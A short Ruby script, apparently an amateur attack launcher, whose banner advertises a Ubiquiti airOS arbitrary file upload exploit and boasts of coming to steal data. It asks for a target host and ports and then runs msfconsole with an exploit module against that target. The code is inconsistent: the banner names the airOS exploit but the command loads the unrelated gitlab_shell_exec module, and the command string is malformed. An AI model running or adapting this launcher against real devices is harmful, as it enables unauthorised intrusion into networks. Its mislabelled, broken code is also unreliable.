puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

		Ubiquiti airOS Arbitrary File Upload

      	   Ubiquiti airOS < 5.6.2

		The target ports: 
  						 RPORT     443
  						 SSH_PORT  22
"""

puts " [?] What is the target? "
print "[!] ---> "

target = gets.chomp

puts " [?] What is the Port ? [Start with 443]  "
print "[!] ---> "

port = gets.chomp

puts " [?] What is the ssh port? [Start with 22] "
print "[!] ---> "

name = gets.chomp



exec("msfconsole -x 'use exploit/multi/http/gitlab_shell_exec' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'set SSH_PORT#{name}' -x 'run' 'run'")
